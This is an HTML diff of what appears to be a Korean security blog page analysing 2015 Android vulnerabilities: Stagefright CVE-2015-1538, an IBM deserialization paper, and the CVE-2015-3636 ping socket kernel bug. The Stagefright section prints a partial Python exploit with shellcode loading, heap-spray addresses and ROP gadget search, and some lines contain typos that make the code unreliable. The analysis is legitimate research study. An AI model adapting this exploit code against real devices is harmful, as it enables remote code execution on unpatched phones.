+<li>chunk_size 가 minus 로 인식되어서 size 는 32 보다 큰데, chunk_size 를 더하면 32 로 감소되고.</li>
+<li>buffer 를 mDataSource 오브젝트 바로 전에 alloc 되게 한다.</li>
+<li>buffer 는 32 바이트 alloc 되는데, read 는 32 바이트 이상된다.</li>
+<li><code>memcpy()</code> 에서 buffer 뒤에 위치한 MPEG4Source 오브젝트의 vtable 이 오염된다.</li>
+<li><code>mDataSource-&gt;readAt()</code> 으로 control flow 가 튀게 된다.</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>case FOURCC('t', 'x', '3', 'g'):
+</span><span class='line'>{
+</span><span class='line'>    uint32_t type;
+</span><span class='line'>    const void *data;
+</span><span class='line'>    size_t size = 0;
+</span><span class='line'>    if (!mLastTrack-&gt;meta-&gt;findData(kKeyTextFormatData, &type, &data, &size)) {
+</span><span class='line'>        size = 0;
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    // chunk_size 를 크게 만들어서 lhs 를 minus 를 만들어서 check 를 뚫는다.
+</span><span class='line'>    if (SIZE_MAX - chunk_size &lt;= size) {
+</span><span class='line'>        return ERROR_MALFORMED;
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    // chunk_size 가 minus 로 인식되어서 size 는 32 보다 큰데, chunk_size 를 더하면 32 로 감소.
+</span><span class='line'>    // overflow here, so that size + chunk_size == 32 and size &gt; 32
+</span><span class='line'>    uint*_t *buffer = new uint8_t[size + chunk_size];
+</span><span class='line'>
+</span><span class='line'>    // buffer 를 mDataSource 오브젝트 바로 전에 alloc 되게 한다.
+</span><span class='line'>    // buffer is allocated immediately before mDataSource
+</span><span class='line'>    if (size &gt; 0) {
+</span><span class='line'>        // 여기서 MPEG4DataSource 오브젝트의 vtable 을 커럽트 시킨다고 한다.
+</span><span class='line'>        // this will overflow and corrupt the mDataSource vtable
+</span><span class='line'>        memcpy(buffer, data, size);
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    // vtable 를 참조하게 되어서 control flow 가 튀게된다고 한다.
+</span><span class='line'>    // this call goes through the corrupt vtable, and we get control of execution
+</span><span class='line'>    if ((size_t)(mDataSource-&gt;readAt(*offset, buffer + size, chunk_size)) &lt; chunk_size) {
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>그러면 이 시나리오를 만들기 위해서 어떻게 box 들을 배치해야 할까?</p>
+
+<ul>
+<li>16 bytes 의 <code>avcC</code></li>
+<li>16 bytes 의 <code>hvcC</code></li>
+</ul>
+
+
+<h4>Mark Brand&rsquo;s Exploit</h4>
+
+<p>돌아다니는 exploit 에는 2 가지가 있는데, Zimperium 코드랑 Mark Brand 가 쓴 파이썬 코드.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python2
+</span><span class='line'>
+</span><span class='line'>import cherrypy
+</span><span class='line'>import os
+</span><span class='line'>import pwnlib.asm as asm
+</span><span class='line'>import pwnlib.elf as elf
+</span><span class='line'>import sys
+</span><span class='line'>import struct
+</span><span class='line'>
+</span><span class='line'>with open('shellcode.bin', 'rb') as tmp:
+</span><span class='line'>    shellcode = tmp.read()
+</span><span class='line'>
+</span><span class='line'>while len(shellcode) % 4 != 0:
+</span><span class='line'>    shellcode += '\x00'
+</span><span class='line'>
+</span><span class='line'># heap grooming configuration
+</span><span class='line'>alloc_size = 0x20
+</span><span class='line'>groom_count = 0x4
+</span><span class='line'>spray_size = 0x10000
+</span><span class='line'>spray_count = 0x10
+</span><span class='line'>
+</span><span class='line'># address of the buffer we allocate for our shellcode
+</span><span class='line'>mmap_address = 0x90000000
+</span><span class='line'>
+</span><span class='line'># addresses that we need to predict
+</span><span class='line'>libc_base = 0xb6ebd000
+</span><span class='line'>spray_address = 0xb3000000
+</span><span class='line'>
+</span><span class='line'># ROP gadget addresses
+</span><span class='line'>stack_pivot = None
+</span><span class='line'>pop_pc = None
+</span><span class='line'>pop_r0_r1_r2_r3_pc = None
+</span><span class='line'>pop_r4_r5_r6_r7_pc = None
+</span><span class='line'>ldr_lr_bx_lr = None
+</span><span class='line'>ldr_lr_bx_lr_stack_pad = 0
+</span><span class='line'>mmap64 = None
+</span><span class='line'>memcpy = None
+</span><span class='line'>
+</span><span class='line'>def find_arm_gadget(e, gadget):
+</span><span class='line'>    gadget_bytes = asm.asm(gadget, arch='arm')
+</span><span class='line'>    gadget_address = None
+</span><span class='line'>    for address in e.search(gadget_bytes):
+</span><span class='line'>        if address % 4 == 0:
+</span><span class='line'>            gadget_address = address
+</span><span class='line'>            if gadget_bytes == e.read(gadget_address, len(gadget_bytes)):
+</span><span class='line'>                print asm.disasm(gadget_bytes, vma=gadget_address, arch='arm')
+</span><span class='line'>                break
+</span><span class='line'>    return gadget_address
+</span><span class='line'>
+</span><span class='line'>def find_thumb_gadget(e, gadget):
+</span><span class='line'>    gadget_bytes = asm.asm(gadget, arch='thumb')
+</span><span class='line'>    gadget_address = None
+</span><span class='line'>    for address in e.search(gadget_bytes):
+</span><span class='line'>        if address % 2 == 0:
+</span><span class='line'>            gadget_address = address + 1
+</span><span class='line'>            if gadget_bytes == e.read(gadget_address - 1, len(gadget_bytes)):
+</span><span class='line'>                print asm.disasm(gadget_bytes, vma=gadget_address-1, arch='thumb')
+</span><span class='line'>                break
+</span><span class='line'>    return gadget_address
+</span><span class='line'>
+</span><span class='line'>def find_gadget(e, gadget):
+</span><span class='line'>    gadget_address = find_thumb_gadget_e, gadget)
+</span><span class='line'>    if gadget_address is not None:
+</span><span class='line'>        return gadget_address
+</span><span class='line'>    return find_arm_gadget(e, gadget)
+</span><span class='line'>
+</span><span class='line'>def find_rop_gadgets(path):
+</span><span class='line'>    global memcpy
+</span><span class='line'>    global mmap64
+</span><span class='line'>    global stack_pivot
+</span><span class='line'>    global pop_pc
+</span><span class='line'>    global pop_r0_r1_r2_r3_pc
+</span><span class='line'>    global pop_r4_r5_r6_r7_pc
+</span><span class='line'>    global ldr_lr_bx_lr
+</span><span class='line'>    global ldr_ldr_bx_lr_stack_pad
+</span><span class='line'>
+</span><span class='line'>    e = elf.ELF(path)
+</span><span class='line'>    e.address = libc_base
+</span><span class='line'>
+</span><span class='line'>    memcpy = e.symbols['memcpy']
+</span><span class='line'>    print '[*] memcpy : 0x{:08x}'.format(memcpy)
+</span><span class='line'>    mmap64 = e.symbols['mmap64']
+</span><span class='line'>    print '[*] mmap64 : 0x{:08x}'.format(mmap64)
+</span><span class='line'>
+</span><span class='line'>    # ADD       R2, R0, #0x4C
+</span><span class='line'>    # LDMIA     R2, {R4-LR}
+</span><span class='line'>    # TEQ       SP, #0
+</span><span class='line'>    # TEQNE     LR, #0
+</span><span class='line'>    # BEQ       botch_0
+</span><span class='line'>    # MOV       R0, R1
+</span><span class='line'>    # TEQ       R0, #0
+</span><span class='line'>    # MOVEQ     R0, #1
+</span><span class='line'>    # BX        LR
+</span><span class='line'>
+</span><span class='line'>    pivot_asm = ''
+</span><span class='line'>    pivot_asm += 'add   r2, r0, #0x4c\n'
+</span><span class='line'>    pivot_asm += 'ldmia r2, {r4 - lr}\n'
+</span><span class='line'>    pivot_asm += 'teq   sp, #0\n'
+</span><span class='line'>    pivot_asm += 'teqne lr, #0'
+</span><span class='line'>    stack_pivot = find_arm_gadget(e, pivot_asm)
+</span><span class='line'>    print '[*] stack_pivot : 0x{:08x}.format(stack_pivot)
+</span><span class='line'>
+</span><span class='line'>    pop_pc_asm = 'pop {pc}'
+</span><span class='line'>    pop_pc = find_gadget(e, pop_pc_asm)
+</span><span class='line'>    print '[*] pop_pc : 0x{:08x}'.format(pop_pc)
+</span><span class='line'>
+</span><span class='line'>    pop_r0_r1_r2_r3_pc = find_gadget(e, 'pop {r0, r1, r2, r3, pc}')
+</span><span class='line'>    print '[*] pop_r0_r1_r2_r3_pc : 0x{:08x}'.format(pop_r0_r1_r2_r3_pc)
+</span><span class='line'>
+</span><span class='line'>    pop_r4_r5_r6_r7_pc = find_gadget(e, 'pop {r4, r5, r6, r7, pc}')
+</span><span class='line'>    print '[*] pop_r4_r5_r6_r7_pc : 0x{:08x}'.format(pop_r4_r5_r6_r7_pc)
+</span><span class='line'>
+</span><span class='line'>    ldr_lr_bx_lr_stack_pad = 0
+</span><span class='line'>    for i in range(0, 0x100, 4):
+</span><span class='line'>        ldr_lr_bx_lr_asm = 'ldr lr, [sp, #0x{:08x}]\n'.format(i)
+</span><span class='line'>        ldr_lr_bx_lr_asm += 'add sp, sp, #0x{:08x}\n'.format(i + 8)
+</span><span class='line'>        ldr_lr_bx_lr_asm += 'bx lr'
+</span><span class='line'>        ldr_lr_bx_lr = find_gadget(e, ldr_lr_bx_lr_asm)
+</span><span class='line'>        if ldr_lr_bx_lr is not None:
+</span><span class='line'>            ldr_lr_bx_lr_stack_pad = i
+</span><span class='line'>            break
+</span><span class='line'>
+</span><span class='line'>    def pad(size):
+</span><span class='line'>        return '#' * size</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Zimperium Exploit</h4>
+
+<p>Joshua Drake 가 <a href="https://raw.githubusercontent.com/jduck/cve-2015-1538-1/master/Stagefright_CVE-2015-1538-1_Exploit.py">exploit</a> 을 공개했다. 분석해본다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/09/13/0-day-deserialization-vulnerabilities-in-android/">0-day Deserialization Vulnerabilities in Android</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-09-13T20:53:16+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:53 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>WOOT15 에 나온 <a href="https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf">One Class to Rule Them All: 0-day Deserialization Vulnerabilities in Android</a> 를 읽고 정리해본다.</p>
+
+<p>저자는 IBM Security 의 Or Peles, Rose Hay.</p>
+
+<h4>CVE-2015-3825</h4>
+
+<p>저자들이 찾은 버그는 <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2015-3825">CVE-2015-3825</a> 를 할당받았다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/09/02/own-your-android-yet-another-universal-root/">Own Your Android! Yet Another Universal Root</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-09-02T09:26:22+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>9:26 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>BlackHat 2015 에 발표된 Own your Android! Yet Another Universal Root, Wen Xu, Yubin Fu. 를 정리해본다.</p>
+
+<p><a href="https://www.youtube.com/watch?v=HVP1c7Ct1nM">BlackHat 발표 영상</a></p>
+
+<h4>Bug analysis</h4>
+
+<ul>
+<li>CVE-2015-3636: Wen Yu 와 wushi (of Keen Team) 이 <a href="https://github.com/kernelslacker/trinity">Trinity fuzzer</a> 로 찾음.</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Paging fault # virtual address 00200200.
+</span><span class='line'>PC is at ping_unhash+0x50/0xd4</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ICMP Ping 을 할 때 지나가는 코드인 것 같은데.</p>
+
+<p><code>socket(AF_INET, SOCK_DGRAM, IP_PROTO_ICMP)</code> 를 할 경우에 다음과 같은 코드를 지나간다고 한다.</p>
+
+<figure class='code'><figcaption><span>net/ipv4/af_inet.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">inet_dgram_connect</span><span class="p">(</span><span class="k">struct</span> <span class="n">socket</span> <span class="o">*</span><span class="n">sock</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">uaddr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">addr_len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span> <span class="o">=</span> <span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">addr_len</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">uaddr</span><span class="o">-&gt;</span><span class="n">sa_family</span><span class="p">))</span>
+</span><span class='line'>        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">uaddr</span><span class="o">-&gt;</span><span class="n">sa_family</span> <span class="o">==</span> <span class="n">AF_UNSPEC</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">return</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_prot</span><span class="o">-&gt;</span><span class="n">disconnect</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">...</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Socket 의 어드레스 패밀리가 unspecified 일 경우, <code>disconnect()</code> 를 호출하는데, PING (ICMP) 의 경우 불리는 함수는 <code>udp_disconnect()</code>.</p>
+
+<figure class='code'><figcaption><span>udp_disconnect()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">udp_disconnect</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">inet_sock</span> <span class="o">*</span><span class="n">inet</span> <span class="o">=</span> <span class="n">inet_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_state</span> <span class="o">=</span> <span class="n">TCP_CLOSE</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">...</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_userlocks</span> <span class="o">&amp;</span> <span class="n">SOCK_BINDPORT_LOCK</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_proto</span><span class="o">-&gt;</span><span class="n">unhash</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">inet</span><span class="o">-&gt;</span><span class="n">inet_sport</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="n">sk_dst_reset</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="n">EXPORT_SYMBOL</span><span class="p">(</span><span class="n">udp_disconnect</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>여기서 <code>sk_prot-&gt;unhash(sk)</code> 를 호출하는데, 그러면 <code>ping_unhash()</code> 가 호출된다.</p>
+
+<p><code>sk_hashed(sk)</code> 로 socket 이 hashed 되어있는지 확인하고, TRUE 라면 sk_nulls_node 를 지운다.</p>
+
+<figure class='code'><figcaption><span>ping_unhash()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">ping_unhash</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">inet_sock</span> <span class="o">*</span><span class="n">isk</span> <span class="o">=</span> <span class="n">inet_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">pr_debug</span><span class="p">(</span><span class="s">&quot;ping_unhash(isk=%p,isk-&gt;num=%u)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">isk</span><span class="p">,</span> <span class="n">isk</span><span class="o">-&gt;</span><span class="n">inet_num</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">sk_hashed</span><span class="p">(</span><span class="n">sk</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">write_lock_bh</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ping_table</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">hlist_nulls_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_nulls_node</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">sock_put</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">isk</span><span class="o">-&gt;</span><span class="n">inet_num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">isk</span><span class="o">-&gt;</span><span class="n">inet_sport</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">sock_prot_inuse_add</span><span class="p">(</span><span class="n">sock_net</span><span class="p">(</span><span class="n">sk</span><span class="p">),</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_prot</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">write_unlock_bh</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ping_table</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>hlist_nulls_del(&amp;sk-&gt;sk_nulls_node)</code> 를 하면, <code>__hlist_nulls_del(n)</code> 으로 지우고, <code>n-&gt;pprev = LIST_POISON2</code> 가 된다.</p>
+
+<figure class='code'><figcaption><span>hlist_nulls_del(struct hlist_nulls_node *n)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">__hlist_nulls_del</span><span class="p">(</span><span class="k">struct</span> <span class="n">hlist_nulls_node</span> <span class="o">*</span><span class="n">n</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">hlist_nulls_node</span> <span class="o">*</span><span class="n">next</span> <span class="o">=</span> <span class="n">n</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">hlist_nulls_ndoe</span> <span class="o">**</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">n</span><span class="o">-&gt;</span><span class="n">pprev</span><span class="p">;</span>
+</span><span class='line'>    <span class="o">*</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_a_nulls</span><span class="p">(</span><span class="n">next</span><span class="p">))</span>
+</span><span class='line'>        <span class="n">next</span><span class="o">-&gt;</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">pprev</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">hlist_nulls_del</span><span class="p">(</span><span class="k">struct</span> <span class="n">hlist_nulls_node</span> <span class="o">*</span><span class="n">n</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">__hlist_nulls_del</span><span class="p">(</span><span class="n">n</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">n</span><span class="o">-&gt;</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">LIST_POISON2</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>n-&gt;pprev = LIST_POISON2</code> 라는 코드가 있는데, <code>LIST_POISON2</code> 의 값은 Android 32/64 bit kernel 에서 모두 <code>0x200200</code> 이다.</p>
+
+<p>저자에 따르면,</p>
+
+<ul>
+<li>connect 를 두번째 부를때, <code>ping_unhash()</code> 가 또 불리고, 리스트에서 지워지기는 했지만, <code>sk_hashed(sk)</code> 체크는 통과해서 다시 <code>hlist_nulls_del(&amp;sk-&gt;sk_nulls_node)</code> 가 또 불린다.</li>
+<li><code>n-&gt;pprev</code> 는 전번의 콜 <code>n-&gt;pprev = LIST_POISON2</code> 에 의해서 LIST_POISON2 인 상황인데, <code>**pprev = n-&gt;pprev;</code> -> <code>*pprev = next;</code> 가 돌아가면 <code>0x200200</code> 에 write 가 들어간다.</li>
+<li>0x200200 이 page mapping 이 안되어 있으면, kernel 에서 fault 가 난다.</li>
+</ul>
+
+
+<p>여기서 local DoS 가 발생하는데, 저자에 따르면 local DoS 는 전체 그림의 일부분이라는 것.</p>
+
+<p><code>ping_unhash()</code> 에서, <code>sk_hashed()</code> 체크 이후에, 리스트에서 지우고, <code>sock_put()</code> 을 부르는데, 저자들은 이게 수상쩍다고 한다.
+<code>sock_put()</code> 를 보면, <code>sk_refcnt</code> 를 줄이고, 0 이면 sk_free() 를 통해서 free 가 들어간다.</p>
+
+<figure class='code'><figcaption><span>sock_put()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">sock_put</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">atomic_dec_and_test</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_refcnt</span><span class="p">))</span>
+</span><span class='line'>        <span class="n">sk_free</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
